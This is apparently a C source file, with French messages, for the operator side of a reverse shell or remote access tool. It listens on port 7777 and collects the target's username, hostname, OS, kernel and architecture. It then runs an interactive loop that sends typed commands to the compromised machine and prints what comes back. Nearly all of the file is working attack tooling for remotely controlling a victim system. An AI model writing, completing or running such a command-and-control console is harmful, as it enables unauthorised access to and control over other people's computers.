#include "fonction.h"

int main() 
{
    const unsigned int portTarget = 7777;
    char buffer_rcv[8192] = "";
    char command[8192] = "";
    char result[8192] = "";
    char *username;
    username = (char *) malloc(sizeof(buffer_rcv));
    char *usernameInit = strdup(username);
    char *hostname;
    hostname = (char *) malloc(sizeof(buffer_rcv));
    char *hostnameInit = strdup(hostname);
    char *osVersion;
    osVersion = (char *) malloc(sizeof(buffer_rcv));
    char *osVersionInit = strdup(osVersion);
    char *kernel;
    kernel = (char *) malloc(sizeof(buffer_rcv));
    char *kernelInit = strdup(kernel);
    char *arch;
    arch = (char *) malloc(sizeof(buffer_rcv));
    char *archInit = strdup(arch);

    SocketType sock = Listen(portTarget);
    recv(sock, buffer_rcv, sizeof(buffer_rcv), 0);
    const unsigned int checkOS = strtoul(buffer_rcv, nullptr, 10);

    if (checkOS == 3) {
        printf(RED "[!] OS inconnu." RESET);
        CloseConnect();
        return 0;
    }

    usleep(100000);
    if (recv(sock, buffer_rcv, sizeof(buffer_rcv), 0) < 0) {
        printf(RED "[!] Erreur lors de la récupération de l'username." RESET);
    }

    Reload(buffer_rcv, username, hostname, osVersion, kernel, arch);

    if (strcmp(username, usernameInit) == 0 || strcmp(hostname, hostnameInit) == 0 || strcmp(osVersion, osVersionInit) == 0 || strcmp(kernel, kernelInit) == 0 ||
            strcmp(arch, archInit) == 0) {
        printf(YELLOW "[ ] Une ou plusieurs informations n'ont pas été correctement récupéré utilisez la commande reload pour mettre à jour.\n" RESET);
        strcpy(username, "Unknow");
        strcpy(hostname, "Unknow");
        strcpy(osVersion, "Unknow");
        strcpy(kernel, "Unknow");
        strcpy(arch, "Unknow");
    }

    printf(BLUE "[i] Informations sur de la cible :\n" RESET);
    SysInfo(hostname, username, osVersion, kernel, arch);

    while (true) {
        memset(buffer_rcv, 0, sizeof(buffer_rcv));

        printf(GREEN "%s@%s" RESET " $ ", username, hostname);

        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = '\0';
        
        if (strcmp(command, "sysinfo") == 0) {
            SysInfo(hostname, username, osVersion, kernel, arch);
            continue;
        } else if (strcmp(command, "exit") == 0) {
            printf("Sortie du shell.");
            CloseConnect();
            return 0;
        } else if (strcmp(command, "") == 0) {
            continue;
        }

        if (send(sock, command, sizeof(command), 0) < 0) {
            printf(RED "[!] Erreur lors de l'envoie de la commande." RESET);
        }

        while (buffer_rcv[0] == '\0') {
            if (recv(sock, buffer_rcv, sizeof(buffer_rcv), 0) < 0) {
                printf(RED "[!] Erreur lors de la récupération de la commande." RESET);
            }
        }

        if (strcmp(command, "reload") == 0) {
            Reload(buffer_rcv, username, hostname, osVersion, kernel, arch);
            printf(BLUE "[i] Informations sur de la cible mise à jour :\n" RESET);
            SysInfo(hostname, username, osVersion, kernel, arch);
            continue;
        }

        if (strcmp(buffer_rcv, "C 3$t v1d3") == 0) {
            continue;
        }
        strcpy(result, buffer_rcv);
        printf("%s", result);
        usleep(100000);
    }
}